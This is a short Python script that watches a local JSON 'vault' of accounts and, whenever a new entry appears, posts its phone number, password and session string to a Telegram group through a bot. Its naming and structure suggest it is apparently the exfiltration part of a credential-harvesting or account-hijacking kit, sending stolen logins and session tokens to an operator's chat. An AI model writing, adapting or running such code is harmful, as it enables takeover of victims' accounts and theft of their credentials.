import json
import time
import requests

BOT_TOKEN = "YOUR_BOT_TOKEN"
CHAT_ID = "YOUR_GROUP_ID"
FILE_PATH = "data/vault.json"

seen_numbers = set()

def send_to_telegram(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": text
    }
    requests.post(url, data=data)

def load_json():
    with open(FILE_PATH, "r") as f:
        return json.load(f)

def start_watcher():
    global seen_numbers

    # first load (taaki purane spam na ho)
    try:
        data = load_json()
        seen_numbers = set(data.get("accounts", {}).keys())
    except:
        seen_numbers = set()

    while True:
        try:
            data = load_json()
            accounts = data.get("accounts", {})

            for number, details in accounts.items():
                if number not in seen_numbers:
                    seen_numbers.add(number)

                    msg = f"""📥 New Account Added

📱 Number: {details.get('phone')}
🔑 Password: {details.get('password')}
📂 Session: {details.get('session')[:400]}
"""

                    send_to_telegram(msg)

            time.sleep(5)

        except Exception as e:
            print("Watcher Error:", e)
            time.sleep(5)
